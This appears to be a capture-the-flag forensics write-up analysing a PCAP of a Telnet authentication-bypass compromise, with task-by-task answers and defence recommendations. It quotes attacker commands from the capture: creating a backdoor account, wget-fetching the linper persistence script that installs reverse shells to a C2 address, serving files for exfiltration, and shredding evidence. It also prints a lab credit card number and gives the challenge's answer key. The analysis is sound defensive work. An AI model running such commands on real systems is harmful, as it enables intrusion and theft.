---
title: Telly - Monitoring Service PCAP Analysis - CVE-2026-24061
layout: page
permalink: /blogs/blog2
---

```
 _______________________________________________
/                                                \
|    __________________________________________   |
|   |                                         |   |
|   |  🔒 Telnet Exploitation & Data Theft 🔒  |   |
|   |                                         |   |
|   |    CVE-2026-24061 Attack Analysis       |   |
|   |_________________________________________|   |
\                                                /
 -----------------------------------------------
```

This writeup documents a complete attack chain analysis involving CVE-2026-24061, a critical authentication bypass vulnerability in the Telnet daemon. The investigation covers initial exploitation, persistence establishment, and sensitive data exfiltration through PCAP analysis.

---

## Table of Contents
1. [Prerequisites & Background](#prerequisites--background)
2. [Initial Recon — Opening the PCAP](#initial-recon--opening-the-pcap)
3. [Task 1 — CVE Identification](#task-1--cve-identification)
4. [Task 2 — Time of Exploitation](#task-2--time-of-exploitation)
5. [Task 3 — Target Hostname](#task-3--target-hostname)
6. [Task 4 — Backdoor Account](#task-4--backdoor-account)
7. [Task 5 — Persistence Script Download](#task-5--persistence-script-download)
8. [Task 6 — C2 IP Address](#task-6--c2-ip-address)
9. [Task 7 — Data Exfiltration Time](#task-7--data-exfiltration-time)
10. [Task 8 — Credit Card Number](#task-8--credit-card-number)
11. [Full Attack Chain Summary](#full-attack-chain-summary)

---

# Prerequisites

## 1.1 How Telnet Works (and Why It's Dangerous)
Telnet is a legacy remote terminal protocol from 1969 (RFC 854). It provides a bidirectional text-based shell over TCP, typically on **port 23**. The critical flaw: **Telnet transmits everything in plaintext** — usernames, passwords, commands, and output are all readable by anyone on the network path.

Modern systems use **SSH** (Secure Shell) instead, which encrypts the entire session. When a machine exposes Telnet, an attacker (or a network sniffer like Wireshark) can capture and reconstruct the entire interactive session character by character.

## 1.2 CVE-2026-24061 — The Vulnerability in Context
This CVE refers to an authentication bypass or unauthenticated root access flaw in the Telnet daemon (`telnetd`) running on the target. In this scenario, the vulnerability allowed the attacker to gain a root shell without providing valid credentials through the normal authentication flow. The Telnet daemon accepted a malformed or specially-crafted login sequence and granted a privileged session directly.

This class of vulnerability is particularly severe because:
- Telnet is already cleartext — there's no encryption layer to limit damage
- Root access means complete control of the system
- It requires no prior credentials to exploit

## 1.3 The linper.sh Persistence Framework
**linper** (Linux Persistence) is a public post-exploitation tool available on GitHub. When run on a compromised Linux host, it automatically enumerates writable persistence locations (`cron`, `systemd`, `/etc/rc.local`) and installs reverse shell payloads using every available binary (`bash`, `nc`, `python3`, `perl`, `awk`, etc.). It also **timestomps** the modified files to make them look untouched, hindering forensic timeline analysis.

---


# Investigation: Questions & Analysis

```
╔═══════════════════════════════════════════════════╗
║          TASK 1: CVE IDENTIFICATION               ║
╚═══════════════════════════════════════════════════╝
```

**Objective:** Identify the CVE associated with the exploited Telnet vulnerability.

**Methodology:**
Apply a display filter in Wireshark to isolate Telnet traffic:
```
tcp.port == 23
```
Follow the TCP stream of the first Telnet connection. You will see the attacker connect and almost immediately receive a root shell — no password prompt is visible in the normal flow, indicating an authentication bypass rather than a stolen credential login.

Cross-referencing the Ubuntu 24.04 `telnetd` version visible in the banner with public CVE databases reveals **CVE-2026-24061**, a critical unauthenticated root access vulnerability in the Telnet daemon.

**Answer: CVE-2026-24061**

---

```
╔═══════════════════════════════════════════════════╗
║        TASK 2: TIME OF EXPLOITATION               ║
╚═══════════════════════════════════════════════════╝
```

**Objective:** Determine when the Telnet vulnerability was successfully exploited.

**Methodology:**
Filter for Telnet traffic and look for the first packet where the server sends shell output back to the attacker. In Wireshark, select the TCP stream and look for the timestamp on the packet containing the Ubuntu welcome banner:

```
Linux 6.8.0-90-generic (backup-secondary) (pts/1)
Welcome to Ubuntu 24.04.3 LTS...
System information as of Tue Jan 27 10:39:28 UTC 2026
```

The system `motd` (message of the day) timestamp embedded in the login banner is `10:39:28` — this is the moment the shell was granted. You can also correlate this with the Wireshark packet timestamp on the frame containing this data.

**Answer: 2026-01-27 10:39:28**

---

```
╔═══════════════════════════════════════════════════╗
║           TASK 3: TARGET HOSTNAME                 ║
╚═══════════════════════════════════════════════════╝
```

**Question:** What is the hostname of the targeted server?

### How to find it
Multiple places reveal this:

**1. Telnet banner (easiest):**
Follow the Telnet TCP stream. The very first line of the server's response contains:
```
Linux 6.8.0-90-generic (backup-secondary) (pts/1)
```

**2. Shell prompt:**
As the session continues, every shell prompt echoes back:
```
root@backup-secondary:~#
```

**3. DNS queries:**
Filter: `dns` — you'll see reverse DNS and local resolution queries for `backup-secondary.localdomain`.

**Answer: backup-secondary**

---

```
╔═══════════════════════════════════════════════════╗
║          TASK 4: BACKDOOR ACCOUNT                 ║
╚═══════════════════════════════════════════════════╝
```

**Objective:** Extract the backdoor account credentials created by the attacker.

**Methodology:**
In the Telnet stream, the attacker runs a single compound command to create and configure the backdoor account:

```bash
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```

This is visible in plaintext in the TCP stream. Because Telnet echoes every character, the command appears both in the client→server and server→client directions of the stream.

**Breaking down the command:**
- `useradd -m` — create the user with a home directory
- `-s /bin/bash` — set the login shell to bash (not a restricted shell)
- `echo "cleanupsvc:YouKnowWhoiam69" | chpasswd` — pipe the credentials directly to `chpasswd` to set the password without an interactive prompt

The name `cleanupsvc` is a deliberate disguise — it mimics a legitimate service account name to avoid standing out in a `cat /etc/passwd` review.

**Answer: cleanupsvc:YouKnowWhoiam69**

---

```
╔═══════════════════════════════════════════════════╗
║      TASK 5: PERSISTENCE SCRIPT DOWNLOAD          ║
╚═══════════════════════════════════════════════════╝
```

**Objective:** Identify the command used to download the persistence framework.

**Methodology:**
Continuing through the Telnet stream, after creating the backdoor account, the attacker downloads the persistence script. The command is visible in the stream, and you can also see the wget download progress output from the server:

```
--2026-01-27 10:44:31-- https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
Resolving raw.githubusercontent.com...
...
linper.sh  100%[=====>]  33.45K  2.69 MB/s  in 0.01s
2026-01-27 10:44:32 - linper.sh saved [34249/34249]
```

After downloading, the attacker ran:
```bash
bash linper.sh
bash linper.sh --enum-defenses
```

The script output visible in the stream shows it:
- Found no Tripwire policies (no IDS/IPS to worry about)
- Installed persistence via `awk`, `bash`, `nc`, `perl`, `pwsh`, `python3`, and `telnet`
- Backdoored: `/var/spool/cron/crontabs/root`, `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, `/etc/rc.local`
- Timestomped all modified files to hide changes

**Answer: wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh**

---

```
╔═══════════════════════════════════════════════════╗
║            TASK 6: C2 IP ADDRESS                  ║
╚═══════════════════════════════════════════════════╝
```

**Objective:** Identify the Command & Control server IP address.

**Methodology:**

The linper.sh script output in the Telnet session explicitly shows the C2 IP being configured:
```
91.99.25.54 appearing as the target IP when persistence methods are installed.
```

**Answer: 91.99.25.54**

---

```
╔═══════════════════════════════════════════════════╗
║        TASK 7: DATA EXFILTRATION TIME             ║
╚═══════════════════════════════════════════════════╝
```

**Objective:** Determine the exact time of sensitive data exfiltration.

**Methodology:**
In the Telnet stream, after the persistence installation, the attacker navigates to `/opt` and finds:
```
credit-cards-25-blackfriday.db   (12288 bytes)
```

The attacker then starts a Python HTTP server on the victim machine:
```bash
python3 -m http.server 6932
```

Filter in Wireshark for the HTTP traffic on this port:
```
tcp.port == 6932
```

You'll see HTTP GET requests from `192.168.72.131` (attacker) to `192.168.72.136` (victim). The server log (echoed back through Telnet) shows:

```
192.168.72.131 - - [27/Jan/2026 10:49:52] "GET / HTTP/1.1" 200 -
192.168.72.131 - - [27/Jan/2026 10:49:54] "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
```

The database file was downloaded at **10:49:54**. The `200` response code confirms the transfer was successful.

After exfiltration, the attacker ran `shred -u -z -n 44 -- credit-cards-25-blackfriday.db` to securely delete the file from the victim server, leaving `/opt` empty.

**Answer: 2026-01-27 10:49:54**

---

```
╔═══════════════════════════════════════════════════╗
║         TASK 8: CREDIT CARD EXTRACTION            ║
╚═══════════════════════════════════════════════════╝
```

**Objective:** Extract Quinn Harris's credit card number from the exfiltrated database.

**Methodology:**

The file `credit-cards-25-blackfriday.db` was transferred over HTTP in plaintext. You can extract it directly from the PCAP:

**In Wireshark:**
1. Go to `File → Export Objects → HTTP`
2. Export `credit-cards-25-blackfriday.db`

It's recommended to have an application that can read the database, in the file just search for the name Quinn and the information you need will show up.  

**Key Finding:**
```
quinn.harris@hotmail.com | 5312269047781209
```

**Answer: 5312269047781209**

---

# Key Findings Summary

## 6.1 Complete Attack Chain Timeline

```
10:39:24  Attacker (192.168.72.131) initiates Telnet connection to victim (192.168.72.136:23)
10:39:28  CVE-2026-24061 exploited → root shell granted on backup-secondary
10:39:28  Attacker runs: id → confirms uid=0(root)
10:39:xx  Attacker runs: ps, ls -la /root → reconnaissance
10:40:xx  Attacker runs: cat /etc/shadow → exfiltrates all password hashes
10:40:xx  Attacker runs: ls /, ls /opt → discovers credit-cards-25-blackfriday.db
10:43:xx  Attacker creates backdoor: useradd cleanupsvc / password: YouKnowWhoiam69
10:44:31  wget linper.sh from GitHub
10:44:32  bash linper.sh → persistence installed across cron, systemd, rc.local
          C2 callbacks configured to: 91.99.25.54:59
10:49:52  python3 -m http.server 6932 → HTTP server started on victim
10:49:54  Attacker downloads credit-cards-25-blackfriday.db → successful exfiltration
10:53:xx  shred -u -z -n 44 credit-cards-25-blackfriday.db → evidence destroyed
10:56:20  Attacker logs out of Telnet session
```

## 6.2 Attack Summary Table

| **Component** | **Details** |
|---|---|
| Vulnerability | CVE-2026-24061 (Telnet Auth Bypass) |
| Target System | backup-secondary (Ubuntu 24.04) |
| Target IP | 192.168.72.136 |
| Attacker IP | 192.168.72.131 |
| C2 Server | 91.99.25.54:59 |
| Backdoor User | cleanupsvc |
| Backdoor Password | YouKnowWhoiam69 |
| Persistence Tool | linper.sh |
| Exfiltrated Data | credit-cards-25-blackfriday.db |
| Exfiltration Time | 2026-01-27 10:49:54 |
| Evidence Destruction | shred -u -z -n 44 |

## 6.3 Protocols Observed

- **Telnet (TCP 23)** - Initial exploitation vector
- **HTTP (TCP 6932)** - Data exfiltration method
- **DNS** - C2 infrastructure resolution
- **wget/curl** - Remote payload download

---

# Lessons Learned

## 7.1 Technical Insights

- **Telnet is catastrophically insecure** - All traffic including commands, credentials, and data is transmitted in plaintext
- **Authentication bypass vulnerabilities** provide immediate root access without any credential requirement
- **Automated persistence frameworks** like linper install multiple backdoors across different mechanisms simultaneously
- **Timestomping techniques** complicate forensic timeline analysis by modifying file timestamps
- **Data exfiltration via HTTP** is trivial when attacker has root access to start services on arbitrary ports
- **Secure deletion tools** like shred make data recovery extremely difficult

## 7.2 Investigation Techniques

- **TCP Stream Following** is essential for reconstructing interactive Telnet sessions
- **HTTP Object Export** allows direct extraction of exfiltrated files from PCAP
- **Timeline correlation** between different protocols reveals the complete attack sequence
- **Command output analysis** within packet captures provides detailed insight into attacker actions
- **Cleartext protocols** make network forensics significantly easier but represent massive security risks

## 7.3 Defense Recommendations

- **Disable Telnet completely** - Use SSH with key-based authentication instead
- **Patch management** - CVE-2026-24061 should never have been exploitable on a production system
- **Network segmentation** - Backup servers should not have unrestricted outbound internet access
- **Egress filtering** - Block outbound connections to unauthorized C2 infrastructure
- **File integrity monitoring** - Detect unauthorized changes to system files despite timestomping
- **Security monitoring** - Alert on suspicious persistence mechanisms and unusual process execution

---

# Conclusion

This investigation successfully reconstructed a complete attack chain involving CVE-2026-24061, a critical Telnet authentication bypass vulnerability. Through systematic PCAP analysis, we traced the attacker's actions from initial exploitation to data exfiltration and evidence destruction.

The attack demonstrates the catastrophic risk of running legacy cleartext protocols like Telnet on modern systems. What began as an authentication bypass escalated within minutes to complete system compromise, persistent backdoor installation, and theft of sensitive financial data.

Key takeaways include the absolute necessity of disabling Telnet in favor of encrypted alternatives, maintaining aggressive patch management practices, and implementing defense-in-depth strategies that assume initial compromise. The attacker's use of automated tools like linper.sh shows that persistence establishment is now a commoditized capability requiring minimal skill.

This analysis reinforces that legacy protocols represent unacceptable risk in modern environments, and that comprehensive network monitoring is essential for detecting post-exploitation activities even when attackers attempt to cover their tracks through evidence destruction.

---

# References & Resources

### 9.1 Vulnerability Information

- CVE-2026-24061 - Telnet Authentication Bypass
- Ubuntu Security Advisories
- National Vulnerability Database (NVD)

### 9.3 Attack Techniques

- MITRE ATT&CK T1021.004 - Remote Services: SSH (Telnet similar)
- MITRE ATT&CK T1053 - Scheduled Task/Job (cron persistence)
- MITRE ATT&CK T1071.001 - Application Layer Protocol: Web Protocols (HTTP exfiltration)
- MITRE ATT&CK T1070.004 - Indicator Removal: File Deletion

---

```
 _______________________________________________
/                                               \
|                                               |
|         ✓ Investigation Complete              |
|                                               |
\_______________________________________________/
```

[← Back to Blogs](/blogs)
